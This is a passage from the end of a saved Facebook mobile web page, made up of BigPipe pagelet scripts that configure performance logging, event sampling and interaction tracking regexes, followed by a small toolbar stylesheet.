                    sevmanager_powersearch_initial_page_load: 10,
                    network_ui: 1,
                    daiquery_interactive_query: 1
                },
                enable_heartbeat: true,
                maxBlockMergeDuration: 0,
                maxBlockMergeDistance: 0,
                enable_banzai_stream: true,
                user_timing_coinflip: 50,
                banzai_stream_coinflip: 1,
                compression_enabled: true,
                ref_counting_fix: false,
                ref_counting_cont_fix: false,
                also_record_new_timeslice_format: false,
                force_async_request_tracing_on: false
            }, 2609], ["FbtQTOverrides", [], {overrides: {}}, 551]]
        },
        last_in_phase: true,
        tti_phase: 0,
        all_phases: [63]
    });
}), "onPageletArrive first_response", {"root": true, "pagelet": "first_response"})();</script>
<script>bigPipe.setPageID("6754352104878490299-0");
CavalryLogger.setPageID("6754352104878490299-0");</script>
<script>bigPipe.beforePageletArrive("last_response")</script>
<script>require("TimeSlice").guard((function () {
    bigPipe.onPageletArrive({
        resource_map: {
            FEt5G: {
                type: "js",
                src: "https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/svFKQXueTby.js?_nc_x=Ij3Wp8lg5Kz"
            }
        },
        allResources: ["rCDRu", "FDfRV", "fKCiQ", "QBVzy", "oFZdM", "wUApz", "x8HfM", "TrKTC", "WAtj5", "3gNeM", "dReEY", "2Csif", "aSKbc", "FEt5G"],
        displayResources: ["rCDRu", "FDfRV", "fKCiQ", "QBVzy", "oFZdM", "TrKTC", "WAtj5", "dReEY", "2Csif", "aSKbc"],
        onload: ["CavalryLogger.getInstance(\"6754352104878490299-0\").setTTIEvent(\"t_domcontent\");"],
        onafterload: ["window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6754352104878490299-0\").setValue(\"t_exit\", window.ExitTime);};"],
        id: "last_response",
        phase: 63,
        jsmods: {
            require: [["NavigationMetrics", "setPage", [], [{
                page: "/wap/index.php",
                page_type: "normal",
                page_uri: "https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.com%2F&_rdr",
                serverLID: "6754352104878490299-0"
            }]], ["CavalryLoggerImpl", "startInstrumentation", [], []], ["ServiceWorkerURLCleaner", "removeRedirectID", [], []]],
            define: [["cr:1109759", ["CookieConsentBlacklist"], {__rc: ["CookieConsentBlacklist", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:1083116", ["XAsyncRequest"], {__rc: ["XAsyncRequest", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:1069930", [], {__rc: [null, "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:1083117", [], {__rc: [null, "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:708886", ["EventProfilerImpl"], {__rc: ["EventProfilerImpl", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["BrowserPaymentHandlerConfig", [], {enabled: false}, 3904], ["MTouchableSyntheticClickGK", [], {USE_SYNTHETIC_CLICK: true}, 368], ["EventConfig", [], {
                sampling: {
                    bandwidth: 0,
                    play: 0,
                    playing: 0,
                    progress: 0,
                    pause: 0,
                    ended: 0,
                    seeked: 0,
                    seeking: 0,
                    waiting: 0,
                    loadedmetadata: 0,
                    canplay: 0,
                    selectionchange: 0,
                    change: 0,
                    timeupdate: 2000000,
                    adaptation: 0,
                    focus: 0,
                    blur: 0,
                    load: 0,
                    error: 0,
                    message: 0,
                    abort: 0,
                    storage: 0,
                    scroll: 200000,
                    mousemove: 20000,
                    mouseover: 10000,
                    mouseout: 10000,
                    mousewheel: 1,
                    MSPointerMove: 10000,
                    keydown: 0.1,
                    click: 0.02,
                    mouseup: 0.02,
                    __100ms: 0.001,
                    __default: 5000,
                    __min: 100,
                    __interactionDefault: 200,
                    __eventDefault: 100000
                },
                page_sampling_boost: 1,
                interaction_regexes: {
                    BlueBarAccountChevronMenu: " _5lxs(?: .*)?$",
                    BlueBarHomeButton: " _bluebarLinkHome__interaction-root(?: .*)?$",
                    BlueBarProfileLink: " _1k67(?: .*)?$",
                    ReactComposerSproutMedia: " _1pnt(?: .*)?$",
                    ReactComposerSproutAlbum: " _1pnu(?: .*)?$",
                    ReactComposerSproutNote: " _3-9x(?: .*)?$",
                    ReactComposerSproutLocation: " _1pnv(?: .*)?$",
                    ReactComposerSproutActivity: " _1pnz(?: .*)?$",
                    ReactComposerSproutPeople: " _1pn-(?: .*)?$",
                    ReactComposerSproutLiveVideo: " _5tv7(?: .*)?$",
                    ReactComposerSproutMarkdown: " _311p(?: .*)?$",
                    ReactComposerSproutFormattedText: " _mwg(?: .*)?$",
                    ReactComposerSproutSticker: " _2vri(?: .*)?$",
                    ReactComposerSproutSponsor: " _5t5q(?: .*)?$",
                    ReactComposerSproutEllipsis: " _1gr3(?: .*)?$",
                    ReactComposerSproutContactYourRepresentative: " _3cnv(?: .*)?$",
                    ReactComposerSproutFunFact: " _2_xs(?: .*)?$",
                    TextExposeSeeMoreLink: " see_more_link(?: .*)?$",
                    SnowliftBigCloseButton: "(?: _xlt(?: .*)? _418x(?: .*)?$| _418x(?: .*)? _xlt(?: .*)?$)",
                    SnowliftPrevPager: "(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)",
                    SnowliftNextPager: "(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)",
                    SnowliftFullScreenButton: "#fbPhotoSnowliftFullScreenSwitch( .+)*",
                    PrivacySelectorMenu: "(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)",
                    ReactComposerFeedXSprouts: " _nh6(?: .*)?$",
                    SproutsComposerStatusTab: " _sg1(?: .*)?$",
                    SproutsComposerLiveVideoTab: " _sg1(?: .*)?$",
                    SproutsComposerAlbumTab: " _sg1(?: .*)?$",
                    composerAudienceSelector: " _ej0(?: .*)?$",
                    FeedHScrollAttachmentsPrevPager: " _1qqy(?: .*)?$",
                    FeedHScrollAttachmentsNextPager: " _1qqz(?: .*)?$",
                    DockChatTabFlyout: " fbDockChatTabFlyout(?: .*)?$",
                    PrivacyLiteJewel: " _59fc(?: .*)?$",
                    ActorSelector: " _6vh(?: .*)?$",
                    LegacyMentionsInput: "(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)",
                    UFIActionLinksEmbedLink: " _2g1w(?: .*)?$",
                    UFIPhotoAttachLink: " UFIPhotoAttachLinkWrapper(?: .*)?$",
                    UFIMentionsInputProxy: " _1osa(?: .*)?$",
                    UFIMentionsInputDummy: " _1osc(?: .*)?$",
                    UFIOrderingModeSelector: " _3scp(?: .*)?$",
                    UFIPager: "(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)",
                    UFIReplyRow: "(?: UFIReplyRow(?: .*)? UFICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)",
                    UFIReplySocialSentence: " UFIReplySocialSentenceRow(?: .*)?$",
                    UFIShareLink: " _5f9b(?: .*)?$",
                    UFIStickerButton: " UFICommentStickerButton(?: .*)?$",
                    MentionsInput: " _5yk1(?: .*)?$",
                    FantaChatTabRoot: " _3_9e(?: .*)?$",
                    SnowliftViewableRoot: " _2-sx(?: .*)?$",
                    ReactBlueBarJewelButton: " _5fwr(?: .*)?$",
                    UFIReactionsDialogLayerImpl: " _1oxk(?: .*)?$",
                    UFIReactionsLikeLinkImpl: " _4x9_(?: .*)?$",
                    UFIReactionsLinkImplRoot: " _khz(?: .*)?$",
                    Reaction: " _iuw(?: .*)?$",
                    UFIReactionsMenuImpl: " _iu-(?: .*)?$",
                    UFIReactionsSpatialReactionIconContainer: " _1fq9(?: .*)?$",
                    VideoComponentPlayButton: " _bsl(?: .*)?$",
                    FeedOptionsPopover: " _b1e(?: .*)?$",
                    UFICommentLikeCount: " UFICommentLikeButton(?: .*)?$",
                    UFICommentLink: " _5yxe(?: .*)?$",
                    ChatTabComposerInputContainer: " _552h(?: .*)?$",
                    ChatTabHeader: " _15p4(?: .*)?$",
                    DraftEditor: " _5rp7(?: .*)?$",
                    ChatSideBarDropDown: " _5vm9(?: .*)?$",
                    SearchBox: " _539-(?: .*)?$",
                    ChatSideBarLink: " _55ln(?: .*)?$",
                    MessengerSearchTypeahead: " _3rh8(?: .*)?$",
                    NotificationListItem: " _33c(?: .*)?$",
                    MessageJewelListItem: " messagesContent(?: .*)?$",
                    Messages_Jewel_Button: " _3eo8(?: .*)?$",
                    Notifications_Jewel_Button: " _3eo9(?: .*)?$",
                    snowliftopen: " _342u(?: .*)?$",
                    NoteTextSeeMoreLink: " _3qd_(?: .*)?$",
                    fbFeedOptionsPopover: " _1he6(?: .*)?$",
                    Requests_Jewel_Button: " _3eoa(?: .*)?$",
                    UFICommentActionLinkAjaxify: " _15-3(?: .*)?$",
                    UFICommentActionLinkRedirect: " _15-6(?: .*)?$",
                    UFICommentActionLinkDispatched: " _15-7(?: .*)?$",
                    UFICommentCloseButton: " _36rj(?: .*)?$",
                    UFICommentActionsRemovePreview: " _460h(?: .*)?$",
                    UFICommentActionsReply: " _460i(?: .*)?$",
                    UFICommentActionsSaleItemMessage: " _460j(?: .*)?$",
                    UFICommentActionsAcceptAnswer: " _460k(?: .*)?$",
                    UFICommentActionsUnacceptAnswer: " _460l(?: .*)?$",
                    UFICommentReactionsLikeLink: " _3-me(?: .*)?$",
                    UFICommentMenu: " _1-be(?: .*)?$",
                    UFIMentionsInputFallback: " _289b(?: .*)?$",
                    UFIMentionsInputComponent: " _289c(?: .*)?$",
                    UFIMentionsInputProxyInput: " _432z(?: .*)?$",
                    UFIMentionsInputProxyDummy: " _432-(?: .*)?$",
                    UFIPrivateReplyLinkMessage: " _14hj(?: .*)?$",
                    UFIPrivateReplyLinkSeeReply: " _14hk(?: .*)?$",
                    ChatCloseButton: " _4vu4(?: .*)?$",
                    ChatTabComposerPhotoUploader: " _13f-(?: .*)?$",
                    ChatTabComposerGroupPollingButton: " _13f_(?: .*)?$",
                    ChatTabComposerGames: " _13ga(?: .*)?$",
                    ChatTabComposerPlan: " _13gb(?: .*)?$",
                    ChatTabComposerFileUploader: " _13gd(?: .*)?$",
                    ChatTabStickersButton: " _13ge(?: .*)?$",
                    ChatTabComposerGifButton: " _13gf(?: .*)?$",
                    ChatTabComposerEmojiPicker: " _13gg(?: .*)?$",
                    ChatTabComposerLikeButton: " _13gi(?: .*)?$",
                    ChatTabComposerP2PButton: " _13gj(?: .*)?$",
                    ChatTabComposerQuickCam: " _13gk(?: .*)?$",
                    ChatTabHeaderAudioRTCButton: " _461a(?: .*)?$",
                    ChatTabHeaderVideoRTCButton: " _461b(?: .*)?$",
                    ChatTabHeaderOptionsButton: " _461_(?: .*)?$",
                    ChatTabHeaderAddToThreadButton: " _4620(?: .*)?$",
                    ReactComposerMediaSprout: " _fk5(?: .*)?$",
                    UFIReactionsBlingSocialSentenceComments: " _-56(?: .*)?$",
                    UFIReactionsBlingSocialSentenceSeens: " _2x0l(?: .*)?$",
                    UFIReactionsBlingSocialSentenceShares: " _2x0m(?: .*)?$",
                    UFIReactionsBlingSocialSentenceViews: " _-5c(?: .*)?$",
                    UFIReactionsBlingSocialSentence: " _-5d(?: .*)?$",
                    UFIReactionsSocialSentence: " _1vaq(?: .*)?$",
                    VideoFullscreenButton: " _39ip(?: .*)?$",
                    Tahoe: " _400z(?: .*)?$",
                    TahoeFromVideoPlayer: " _1vek(?: .*)?$",
                    TahoeFromVideoLink: " _2-40(?: .*)?$",
                    TahoeFromPhoto: " _2ju5(?: .*)?$",
                    FBStoryTrayItem: " _1fvw(?: .*)?$",
                    Mobile_Feed_Jewel_Button: "#feed_jewel( .+)*",
                    Mobile_Requests_Jewel_Button: "#requests_jewel( .+)*",
                    Mobile_Messages_Jewel_Button: "#messages_jewel( .+)*",
                    Mobile_Notifications_Jewel_Button: "#notifications_jewel( .+)*",
                    Mobile_Search_Jewel_Button: "#search_jewel( .+)*",
                    Mobile_Bookmarks_Jewel_Button: "#bookmarks_jewel( .+)*",
                    Mobile_Feed_UFI_Comment_Button_Permalink: " _l-a(?: .*)?$",
                    Mobile_Feed_UFI_Comment_Button_Flyout: " _4qeq(?: .*)?$",
                    Mobile_Feed_UFI_Token_Bar_Flyout: " _4qer(?: .*)?$",
                    Mobile_Feed_UFI_Token_Bar_Permalink: " _4-09(?: .*)?$",
                    Mobile_UFI_Share_Button: " _15kr(?: .*)?$",
                    Mobile_Feed_Photo_Permalink: " _1mh-(?: .*)?$",
                    Mobile_Feed_Video_Permalink: " _65g_(?: .*)?$",
                    Mobile_Feed_Profile_Permalink: " _4kk6(?: .*)?$",
                    Mobile_Feed_Story_Permalink: " _26yo(?: .*)?$",
                    Mobile_Feed_Page_Permalink: " _4e81(?: .*)?$",
                    Mobile_Feed_Group_Permalink: " _20u1(?: .*)?$",
                    Mobile_Feed_Event_Permalink: " _20u0(?: .*)?$",
                    ProfileIntroCardAddFeaturedMedia: " _30qr(?: .*)?$",
                    ProfileSectionAbout: " _84wb(?: .*)?$",
                    ProfileSectionAllRelationships: " _84wc(?: .*)?$",
                    ProfileSectionAtWork: " _2fnv(?: .*)?$",
                    ProfileSectionContactBasic: " _84vf(?: .*)?$",
                    ProfileSectionEducation: " _84vh(?: .*)?$",
                    ProfileSectionOverview: " _84vj(?: .*)?$",
                    ProfileSectionPlaces: " _84vg(?: .*)?$",
                    ProfileSectionYearOverviews: " _84vi(?: .*)?$",
                    IntlPolyglotHomepage: " _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$",
                    ProtonElementSelection: " _67ft(?: .*)?$"
                },
                interaction_boost: {
                    SnowliftPrevPager: 0.2,
                    SnowliftNextPager: 0.2,
                    ChatSideBarLink: 2,
                    MessengerSearchTypeahead: 2,
                    Messages_Jewel_Button: 2.5,
                    Notifications_Jewel_Button: 1.5,
                    Tahoe: 30,
                    ProtonElementSelection: 4
                },
                event_types: {
                    BlueBarAccountChevronMenu: ["click"],
                    BlueBarHomeButton: ["click"],
                    BlueBarProfileLink: ["click"],
                    ReactComposerSproutMedia: ["click"],
                    ReactComposerSproutAlbum: ["click"],
                    ReactComposerSproutNote: ["click"],
                    ReactComposerSproutLocation: ["click"],
                    ReactComposerSproutActivity: ["click"],
                    ReactComposerSproutPeople: ["click"],
                    ReactComposerSproutLiveVideo: ["click"],
                    ReactComposerSproutMarkdown: ["click"],
                    ReactComposerSproutFormattedText: ["click"],
                    ReactComposerSproutSticker: ["click"],
                    ReactComposerSproutSponsor: ["click"],
                    ReactComposerSproutEllipsis: ["click"],
                    ReactComposerSproutContactYourRepresentative: ["click"],
                    ReactComposerSproutFunFact: ["click"],
                    TextExposeSeeMoreLink: ["click"],
                    SnowliftBigCloseButton: ["click"],
                    SnowliftPrevPager: ["click"],
                    SnowliftNextPager: ["click"],
                    SnowliftFullScreenButton: ["click"],
                    PrivacySelectorMenu: ["click"],
                    ReactComposerFeedXSprouts: ["click"],
                    SproutsComposerStatusTab: ["click"],
                    SproutsComposerLiveVideoTab: ["click"],
                    SproutsComposerAlbumTab: ["click"],
                    composerAudienceSelector: ["click"],
                    FeedHScrollAttachmentsPrevPager: ["click"],
                    FeedHScrollAttachmentsNextPager: ["click"],
                    DockChatTabFlyout: ["click"],
                    PrivacyLiteJewel: ["click"],
                    ActorSelector: ["click"],
                    LegacyMentionsInput: ["click"],
                    UFIActionLinksEmbedLink: ["click"],
                    UFIPhotoAttachLink: ["click"],
                    UFIMentionsInputProxy: ["click"],
                    UFIMentionsInputDummy: ["click"],
                    UFIOrderingModeSelector: ["click"],
                    UFIPager: ["click"],
                    UFIReplyRow: ["click"],
                    UFIReplySocialSentence: ["click"],
                    UFIShareLink: ["click"],
                    UFIStickerButton: ["click"],
                    MentionsInput: ["click"],
                    FantaChatTabRoot: ["click"],
                    SnowliftViewableRoot: ["click"],
                    ReactBlueBarJewelButton: ["click"],
                    UFIReactionsDialogLayerImpl: ["click"],
                    UFIReactionsLikeLinkImpl: ["click"],
                    UFIReactionsLinkImplRoot: ["click"],
                    Reaction: ["click"],
                    UFIReactionsMenuImpl: ["click"],
                    UFIReactionsSpatialReactionIconContainer: ["click"],
                    VideoComponentPlayButton: ["click"],
                    FeedOptionsPopover: ["click"],
                    UFICommentLikeCount: ["click"],
                    UFICommentLink: ["click"],
                    ChatTabComposerInputContainer: ["click"],
                    ChatTabHeader: ["click"],
                    DraftEditor: ["click"],
                    ChatSideBarDropDown: ["click"],
                    SearchBox: ["click"],
                    ChatSideBarLink: ["mouseup"],
                    MessengerSearchTypeahead: ["click"],
                    NotificationListItem: ["click"],
                    MessageJewelListItem: ["click"],
                    Messages_Jewel_Button: ["click"],
                    Notifications_Jewel_Button: ["click"],
                    snowliftopen: ["click"],
                    NoteTextSeeMoreLink: ["click"],
                    fbFeedOptionsPopover: ["click"],
                    Requests_Jewel_Button: ["click"],
                    UFICommentActionLinkAjaxify: ["click"],
                    UFICommentActionLinkRedirect: ["click"],
                    UFICommentActionLinkDispatched: ["click"],
                    UFICommentCloseButton: ["click"],
                    UFICommentActionsRemovePreview: ["click"],
                    UFICommentActionsReply: ["click"],
                    UFICommentActionsSaleItemMessage: ["click"],
                    UFICommentActionsAcceptAnswer: ["click"],
                    UFICommentActionsUnacceptAnswer: ["click"],
                    UFICommentReactionsLikeLink: ["click"],
                    UFICommentMenu: ["click"],
                    UFIMentionsInputFallback: ["click"],
                    UFIMentionsInputComponent: ["click"],
                    UFIMentionsInputProxyInput: ["click"],
                    UFIMentionsInputProxyDummy: ["click"],
                    UFIPrivateReplyLinkMessage: ["click"],
                    UFIPrivateReplyLinkSeeReply: ["click"],
                    ChatCloseButton: ["click"],
                    ChatTabComposerPhotoUploader: ["click"],
                    ChatTabComposerGroupPollingButton: ["click"],
                    ChatTabComposerGames: ["click"],
                    ChatTabComposerPlan: ["click"],
                    ChatTabComposerFileUploader: ["click"],
                    ChatTabStickersButton: ["click"],
                    ChatTabComposerGifButton: ["click"],
                    ChatTabComposerEmojiPicker: ["click"],
                    ChatTabComposerLikeButton: ["click"],
                    ChatTabComposerP2PButton: ["click"],
                    ChatTabComposerQuickCam: ["click"],
                    ChatTabHeaderAudioRTCButton: ["click"],
                    ChatTabHeaderVideoRTCButton: ["click"],
                    ChatTabHeaderOptionsButton: ["click"],
                    ChatTabHeaderAddToThreadButton: ["click"],
                    ReactComposerMediaSprout: ["click"],
                    UFIReactionsBlingSocialSentenceComments: ["click"],
                    UFIReactionsBlingSocialSentenceSeens: ["click"],
                    UFIReactionsBlingSocialSentenceShares: ["click"],
                    UFIReactionsBlingSocialSentenceViews: ["click"],
                    UFIReactionsBlingSocialSentence: ["click"],
                    UFIReactionsSocialSentence: ["click"],
                    VideoFullscreenButton: ["click"],
                    Tahoe: ["click"],
                    TahoeFromVideoPlayer: ["click"],
                    TahoeFromVideoLink: ["click"],
                    TahoeFromPhoto: ["click"],
                    "": ["click"],
                    FBStoryTrayItem: ["click"],
                    Mobile_Feed_Jewel_Button: ["click"],
                    Mobile_Requests_Jewel_Button: ["click"],
                    Mobile_Messages_Jewel_Button: ["click"],
                    Mobile_Notifications_Jewel_Button: ["click"],
                    Mobile_Search_Jewel_Button: ["click"],
                    Mobile_Bookmarks_Jewel_Button: ["click"],
                    Mobile_Feed_UFI_Comment_Button_Permalink: ["click"],
                    Mobile_Feed_UFI_Comment_Button_Flyout: ["click"],
                    Mobile_Feed_UFI_Token_Bar_Flyout: ["click"],
                    Mobile_Feed_UFI_Token_Bar_Permalink: ["click"],
                    Mobile_UFI_Share_Button: ["click"],
                    Mobile_Feed_Photo_Permalink: ["click"],
                    Mobile_Feed_Video_Permalink: ["click"],
                    Mobile_Feed_Profile_Permalink: ["click"],
                    Mobile_Feed_Story_Permalink: ["click"],
                    Mobile_Feed_Page_Permalink: ["click"],
                    Mobile_Feed_Group_Permalink: ["click"],
                    Mobile_Feed_Event_Permalink: ["click"],
                    ProfileIntroCardAddFeaturedMedia: ["click"],
                    ProfileSectionAbout: ["click"],
                    ProfileSectionAllRelationships: ["click"],
                    ProfileSectionAtWork: ["click"],
                    ProfileSectionContactBasic: ["click"],
                    ProfileSectionEducation: ["click"],
                    ProfileSectionOverview: ["click"],
                    ProfileSectionPlaces: ["click"],
                    ProfileSectionYearOverviews: ["click"],
                    IntlPolyglotHomepage: ["click"],
                    ProtonElementSelection: ["click"]
                },
                manual_instrumentation: false,
                profile_eager_execution: true,
                disable_heuristic: true,
                disable_event_profiler: false
            }, 1726], ["DirectDownloadEvents", [], {
                downloadFb4aViaShimClick: "download_fb4a_via_shim_click",
                upgrade_page_imp: "upgrade_page_imp",
                upgrade_button_click: "upgrade_button_click",
                sideload_installer_as_preloads: "sideload_installer_as_preloads",
                try_open_appmanager_deep_link_web_install: "try_open_appmanager_deep_link_web_install",
                logged_out_banner_google_play_redirect_failed: "logged_out_banner_google_play_redirect_failed",
                logged_out_banner_impression_client: "logged_out_banner_impression_client",
                logged_out_banner_upgrade_button_click: "logged_out_banner_upgrade_button_click"
            }, 2368], ["KillabyteProfilerConfig", [], {
                htmlProfilerModule: null,
                profilerModule: null,
                depTypes: {BL: "bl", NON_BL: "non-bl"}
            }, 1145], ["QuicklingConfig", [], {
                version: "1001372137;0;",
                sessionLength: 30,
                inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|\\.pdf|.+/settings/)$",
                badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                logRefreshOverhead: false
            }, 60]]
        },
        last_in_phase: true,
        the_end: true
    });
}), "onPageletArrive last_response", {"root": true, "pagelet": "last_response"})();</script>
<style>.tb_button {
    padding: 1px;
    cursor: pointer;
    border-right: 1px solid #8b8b8b;
    border-left: 1px solid #FFF;
    border-bottom: 1px solid #fff;
}

.tb_button.hover {
    borer: 2px outset #def;
    background-color: #f8f8f8 !important;
}

.ws_toolbar {
    z-index: 100000
}

.ws_toolbar .ws_tb_btn {
    cursor: pointer;
    border: 1px solid #555;
    padding: 3px
}

.tb_highlight {
    background-color: yellow
}

.tb_hide {
    visibility: hidden
}

.ws_toolbar img {
    padding: 2px;
    margin: 0px
}</style>
</body>
</html>